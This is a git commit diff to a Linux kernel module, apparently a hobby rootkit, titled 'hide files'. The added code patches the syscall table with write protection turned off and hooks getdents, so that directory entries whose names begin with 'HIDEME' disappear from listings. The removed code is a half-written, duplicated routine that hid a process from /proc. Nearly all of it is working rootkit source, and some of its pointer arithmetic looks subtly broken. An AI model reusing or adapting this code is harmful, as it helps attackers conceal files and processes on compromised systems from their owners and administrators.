f4937864e3191436d7d86e98225adec61b1d0ad1
root <natcastets@icloud.com>
2019-02-10 19:52:25 +0100

    hide files

--- prime.c
+++ prime.c
@@ -2,7 +2,9 @@
 #include <linux/module.h>
 #include <linux/sched.h>
 #include <linux/sched/signal.h>
+#include <linux/slab.h>
 #include <linux/unistd.h>
+#include <linux/uaccess.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Nathan Castets & Olivier Huge");
@@ -10,15 +12,97 @@ MODULE_DESCRIPTION("Fallen Dragon, Peter F. Hamilton");
 
 #define SEARCH_RANGE 512
 #define PATTERN_SIZE 7
+#define MAGIC_PREFIX "HIDEME"
+#define MAGIC_PREFIX_LEN 6
+
+struct linux_dirent {
+  unsigned long d_ino;
+  unsigned long d_off;
+  unsigned short d_reclen;
+  char d_name[1];
+};
 
 static void **sys_call_table;
 static void **ia32_sys_call_table;
 
-asmlinkage long (*real_close)(struct pt_regs *);
+asmlinkage long (*real_getdents)(struct pt_regs *);
 
-asmlinkage long fake_close(struct pt_regs *regs) {
-  printk(KERN_INFO "sys_close hooked");
-  return (*real_close)(regs);
+asmlinkage long fake_getdents(struct pt_regs *regs) {
+  int i, j;
+  unsigned short last_d_reclen;
+  long bytes_read;
+  unsigned char *buffer;
+  struct linux_dirent __user *dirent_user;
+  struct linux_dirent *dirent_kernel;
+  struct linux_dirent *last_dirent_kernel;
+
+  bytes_read = (*real_getdents)(regs);
+  dirent_user = (struct linux_dirent __user *)regs->si;
+  buffer = kmalloc(bytes_read, GFP_KERNEL);
+  if (!buffer) {
+    printk(KERN_INFO "failed to kmalloc buffer");
+    return bytes_read;
+  }
+  if(copy_from_user(buffer, (unsigned char *)dirent_user, bytes_read)) {
+    printk(KERN_INFO "failed to copy_from_user dirent");
+    kfree(buffer);
+    return bytes_read;
+  }
+  
+  i = 0;
+  last_d_reclen = 0;
+  dirent_kernel = (struct linux_dirent *)buffer;
+  while (i < bytes_read) {
+    j = 0;
+    while (j < MAGIC_PREFIX_LEN && dirent_kernel->d_name[j] != '\0' && dirent_kernel->d_name[j] == MAGIC_PREFIX[j])
+      j++;
+
+    if (j == MAGIC_PREFIX_LEN) {
+      printk(KERN_INFO "magic prefix found : %s", dirent_kernel->d_name);
+      printk(KERN_INFO "d_reclen + %u", last_d_reclen);
+
+      if (last_d_reclen == 0) {
+	struct linux_dirent *next_dirent_kernel = (struct linux_dirent *)(buffer + i + dirent_kernel->d_reclen);
+	unsigned short dirent_kernel_len = dirent_kernel->d_reclen;
+	unsigned short next_dirent_kernel_len = next_dirent_kernel->d_reclen;
+	unsigned char *buffer_dirent_kernel = kmalloc(dirent_kernel_len, GFP_KERNEL);
+	if (!buffer_dirent_kernel) {
+	  printk(KERN_INFO "failed to kmalloc buffer_dirent_kernel");
+	  continue;
+	}
+
+	unsigned char *buffer_next_dirent_kernel = kmalloc(next_dirent_kernel_len, GFP_KERNEL);
+	if (!buffer_next_dirent_kernel) {
+	  printk(KERN_INFO "failed to kmalloc buffer_next_dirent_kernel");
+	  kfree(buffer_dirent_kernel);
+	  continue;
+	}
+	
+	memcpy(buffer_dirent_kernel, dirent_kernel, dirent_kernel_len);
+	memcpy(buffer_next_dirent_kernel, next_dirent_kernel, next_dirent_kernel_len);
+
+	memcpy(dirent_kernel, buffer_next_dirent_kernel, next_dirent_kernel_len);
+	memcpy(dirent_kernel + next_dirent_kernel_len, buffer_dirent_kernel, dirent_kernel_len);
+
+	kfree(buffer_dirent_kernel);
+	kfree(buffer_next_dirent_kernel);
+      }
+      else {
+	last_dirent_kernel = (struct linux_dirent *)(buffer + i - last_d_reclen);
+	last_dirent_kernel->d_reclen += dirent_kernel->d_reclen;
+      }
+    }
+
+    last_d_reclen = dirent_kernel->d_reclen;
+    i += dirent_kernel->d_reclen;
+    dirent_kernel = (struct linux_dirent *)(buffer + i);
+  }
+
+  if (copy_to_user(dirent_user, buffer, bytes_read))
+    printk(KERN_INFO "failed to copy_to_user buffer");
+  
+  kfree(buffer);
+  return bytes_read;
 }
 
 static void search_sys_call_table(void) {
@@ -82,105 +166,6 @@ static void search_sys_call_table(void) {
     printk(KERN_INFO "failed to find ia32_sys_call_table address");
 }
 
-
-
-/* --------------------------------------------------------------------- */
-
-C
-
-static char *proc_to_hide = "1337";
-static struct dir_context *backup_ctx;
-
-static int rk_filldir_t(struct dir_context *ctx, const char *proc_name, int len,
-			loff_t off, u64 ino, unsigned int d_type)
-{
-  if (strncmp(proc_name, proc_to_hide, strlen(proc_to_hide)) == 0)
-    return 0;
-
-  return backup_ctx->actor(backup_ctx, proc_name, len, off, ino, d_type);
-}
-
-struct dir_context rk_ctx = {
-  .actor = rk_filldir_t,
-};
-
-int rk_iterate_shared(struct file *file, struct dir_context *ctx)
-{
-  int result = 0;
-  rk_ctx.pos = ctx->pos;
-  backup_ctx = ctx;
-  result = backup_proc_fops->iterate_shared(file, &rk_ctx);
-  ctx->pos = rk_ctx.pos;
-
-  return result;
-}
-
-static char *proc_to_hide = "1337";
-static struct dir_context *backup_ctx;
-
-static int rk_filldir_t(struct dir_context *ctx, const char *proc_name, int len,
-			loff_t off, u64 ino, unsigned int d_type)
-{
-  if (strncmp(proc_name, proc_to_hide, strlen(proc_to_hide)) == 0)
-    return 0;
-
-  return backup_ctx->actor(backup_ctx, proc_name, len, off, ino, d_type);
-}
-
-struct dir_context rk_ctx = {
-  .actor = rk_filldir_t,
-};
-
-int rk_iterate_shared(struct file *file, struct dir_context *ctx)
-{
-  int result = 0;
-  rk_ctx.pos = ctx->pos;
-  backup_ctx = ctx;
-  result = backup_proc_fops->iterate_shared(file, &rk_ctx);
-  ctx->pos = rk_ctx.pos;
-
-  return result;
-}
-
-static struct file_operations backup_fops;
-static struct file_operations new_fops;
-static struct inode proc_inode;
-
-int (*backup_iterate_shared) (struct file *, struct dir_context *);
-
-static void hide_process(pid_t pid) {
-  struct path p;
-
-  if(kern_path("/proc", 0, &p))
-    return 0;
-
-  /* get the inode*/
-  proc_inode = p.dentry->d_inode;
-  
-  /* get a copy of file_operations from inode */
-  proc_fops = *proc_inode->i_fop;
-  /* backup the file_operations */
-  backup_proc_fops = proc_inode->i_fop;
-  /* modify the copy with out evil function */
-  proc_fops.iterate_shared = rk_iterate_shared;
-  /* overwrite the proc entry's file_operations */
-  proc_inode->i_fop = &proc_fops;
-
-  return 0;
-}
-
-static void unhide_process() {
-  /* fetch the proc entry */
-  struct path p;
-
-  if(kern_path("/proc", 0, &p))
-    return;
-
-  /* get inode and restore file_operations */
-  proc_inode = p.dentry->d_inode;
-  proc_inode->i_fop = backup_proc_fops;
-}
-
 static void hook_syscall(void) {
   if (!sys_call_table) {
     printk(KERN_INFO "failed to hook syscall64, sys_call_table address is missing");
@@ -188,8 +173,8 @@ static void hook_syscall(void) {
   }
 
   write_cr0(read_cr0() & ~0x10000);
-  real_close = sys_call_table[__NR_close];
-  sys_call_table[__NR_close] = fake_close;
+  real_getdents = sys_call_table[__NR_getdents];
+  sys_call_table[__NR_getdents] = fake_getdents;
   write_cr0(read_cr0() | 0x10000);
 }
 
@@ -200,7 +185,7 @@ static void unhook_syscall(void) {
   }
 
   write_cr0(read_cr0() & ~0x10000);
-  sys_call_table[__NR_close] = real_close;
+  sys_call_table[__NR_getdents] = real_getdents;
   write_cr0(read_cr0() | 0x10000);
 }
 
